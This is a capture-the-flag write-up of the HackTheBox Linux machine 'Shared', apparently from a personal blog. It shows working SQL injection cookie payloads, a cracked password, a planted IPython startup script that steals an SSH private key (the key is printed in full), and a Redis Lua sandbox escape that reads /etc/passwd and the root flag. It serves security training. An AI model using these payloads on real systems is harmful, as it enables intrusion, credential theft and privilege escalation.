---
layout: post
title: HackTheBox - Shared
date: 2022-09-26 15:31 +0200
author: Arcee
tags: htb box medium linux
categories: [HackTheBox, Box]
---
![Untitled](/assets/img/posts/htb-shared/Untitled.png)

Medium Linux Box

## Box Info:

Name: Linux

Release date: 23-06-2022

OS: Linux

Solve date: 26-9-2022

## Enumeration

Nmap results:

```bash
$ nmap -sC -sV -p- 10.10.11.172    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 14:30 CEST
Nmap scan report for 10.10.11.172
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds
```

We have an open ssh port, a website and port 443 which is open. The scan also reveals the hostname of the machien, which we add to /etc/hosts

![Untitled](/assets/img/posts/htb-shared/Untitled%201.png)

When clicking around the site we find that there is also a page checkout.shared.htb, so we add that to the /etc/hosts as well. 

![Untitled](/assets/img/posts/htb-shared/Untitled%202.png)

Info can be added, but nothing is actually done with it. So this seems like a dead end. 

At the bottom of the website we can see that the shop is hosted by PrestaShop 

![Untitled](/assets/img/posts/htb-shared/Untitled%203.png)

When googling we find this: [https://build.prestashop-project.org/news/major-security-vulnerability-on-prestashop-websites/](https://build.prestashop-project.org/news/major-security-vulnerability-on-prestashop-websites/) 

So PrestaShop is vulnerable to remote code execution. We can try to see if we can use this!

In the traffic to the server we see a ‘custom_cart’ cookie that we can change the value of 

For example if we have custom_cart set as `{"' and 0=1 union select 1,2,3-- -":"1"}`then we get the following result: 

![Untitled](/assets/img/posts/htb-shared/Untitled%204.png)

We can use this to find the name of the database in use: 

`{"' and 0=1 union select 1,database(),3-- -":"1"}`

![Untitled](/assets/img/posts/htb-shared/Untitled%205.png)

Which gives us checkout. So we can try to list the tables: 

`{"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}`

![Untitled](/assets/img/posts/htb-shared/Untitled%206.png)

So there is a table user, now we can try to find the usernames: 

`{"' and 0=1 union select 1,username,2 from checkout.user-- -":"1"}`

![Untitled](/assets/img/posts/htb-shared/Untitled%207.png)

And we can try to get the password associated with this user:

![Untitled](/assets/img/posts/htb-shared/Untitled%208.png)

Which is a hash: fc895d4eddc2fc12f995e18c865cf273 

We first try crackstation to see if this hash has already been cracked, which it is: 

![Untitled](/assets/img/posts/htb-shared/Untitled%209.png)

So the password for user james_mason is Soleil101. 

We use these to get ssh access!

```bash
$ ssh james_mason@10.10.11.172 
james_mason@shared:~$ whoami
james_mason
james_mason@shared:~$ hostname -I
10.10.11.172 
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
james_mason@shared:~$
```

There doesn’t seem to be a user.txt flag, so this is probably not the correct user we need. We can check what users have access to a console:

```bash
james_mason@shared:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```

So we probably have to move to dan_smith!

We try to get pspy on the machine: 

```bash
──(arcee㉿soundwave)-[~/Documents/Tools]
└─$ python3 -m  http.server 4444

james_mason@shared:~$ wget http://10.10.14.3:4444/pspy64
```

When running pspy we see that UID 1001 executes some ipython things: 

```bash
2022/09/26 08:55:01 CMD: UID=1001 PID=1574   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython                                                                                                     
2022/09/26 08:55:01 CMD: UID=1001 PID=1575   | /usr/bin/pkill ipython 
2022/09/26 08:55:01 CMD: UID=0    PID=1576   | /usr/sbin/CRON -f 
2022/09/26 08:55:01 CMD: UID=1001 PID=1577   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
```

We google for vulnerabilities in ipython and we get: [https://github-com.translate.goog/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=nl&_x_tr_pto=wapp](https://github-com.translate.goog/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=nl&_x_tr_pto=wapp)

We try to replicate:

```bash
james_mason@shared:~$ mkdir -m 777 /opt/scripts_review/profile_default/
james_mason@shared:~$ mkdir -m 777 /opt/scripts_review/profile_default/startup
james_mason@shared:~$ echo "import os;os.system('cat ~/.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/poc.py
james_mason@shared:~$ cd /home/dan_smith
james_mason@shared:/home/dan_smith$ ls
user.txt
james_mason@shared:/home/dan_smith$ ls
dan_smith.key  user.txt
james_mason@shared:/home/dan_smith$ cat dan_smith.key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ
FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku
sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl
4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx
FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe/Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD
oQtePOEc/XuVff+kQH7PU9J1c0F/hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E
u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP/lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2
EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K/ueAvb248pjZeKcMTST2jUh23Vjvv/jj4dPyoj
4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw
FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl
wEnqD0h5lsxYrJqJH2MvDsrqXfMtVlwOI3M7failIAXrVVA4motXJBQXj1peBt8qkNoIbh
4QzwQvpQpd5jH9VyeyYJt7GvhLkT2RQwlIkwksQPC7LmK1gMArcSYGt9c1sRRwFU4UcHym
+EIdpfa1xrSuhtOfg11o/jgHv0N+IAjIBRuId5j8O7Uc9qZU0QUH4C3K71Q6ELXjzhHP17
lX3/pEB+z1PSdXNBf4Qu4G5JZtmwPGEzZZwkNmdmfh0s3hFw+a17QgOvReBLtRQqHS0TgC
zT4KwDOC4DGw98WluQamVq5tuLj/5QAAAAMBAAEAAAGBAK05auPU9BzHO6Vd/tuzUci/ep
wiOrhOMHSxA4y72w6NeIlg7Uev8gva5Bc41VAMZXEzyXFn8kXGvOqQoLYkYX1vKi13fG0r
SYpNLH5/SpQUaa0R52uDoIN15+bsI1NzOsdlvSTvCIUIE1GKYrK2t41lMsnkfQsvf9zPtR
1TA+uLDcgGbHNEBtR7aQ41E9rDA62NTjvfifResJZre/NFFIRyD9+C0az9nEBLRAhtTfMC
E7cRkY0zDSmc6vpn7CTMXOQvdLao1WP2k/dSpwiIOWpSLIbpPHEKBEFDbKMeJ2G9uvxXtJ
f3uQ14rvy+tRTog/B3/PgziSb6wvHri6ijt6N9PQnKURVlZbkx3yr397oVMCiTe2FA+I/Y
pPtQxpmHjyClPWUsN45PwWF+D0ofLJishFH7ylAsOeDHsUVmhgOeRyywkDWFWMdz+Ke+XQ
YWfa9RiI5aTaWdOrytt2l3Djd1V1/c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAA
AMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9/UOgm
2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM
wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtN
CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6
GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY
Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/H
I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKU
SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbE
SENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE
wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW
HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs
tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

We now save this SSH key and can then log in as dan_smith. 

```bash
$ ssh dan_smith@10.10.11.172 -i id_rsa
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~$ cat user.txt
98****************************18
```

We now download linpeas and run it to see if we can find something interesting. We also look at what groups there are and what specific files are associated with them: 

```bash
dan_smith@shared:~$ groups
dan_smith developer sysadmin
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
```

When we execute the file: 

```bash
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:13281
run_id:5055adf8d2906df2989832384df46ac8857a52b8
tcp_port:6379
uptime_in_seconds:2
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:3253365
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

It looks like a password is needed (see first line), so we need to figure out what the password is. We download the file to our own system: 

```bash
scp -i id_rsa dan_smith@10.10.11.172:/usr/local/bin/redis_connector_dev redis_connector_dev
```

Next we execute and try to intercept the traffic with netcat:

```bash
$ nc -lnvp 6379                    
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 53700
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

We can now use the redis-cli with the password: 

```bash
dan_smith@shared:~$ redis-cli -h 127.0.0.1 -p 6379 -a 'F2WHqJUz2WEz=Gqq'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res' 0
"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\njames_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false\ndan_smith:x:1001:1002::/home/dan_smith:/bin/bash\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\n"
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
"81****************************ae\n"
127.0.0.1:6379>
```
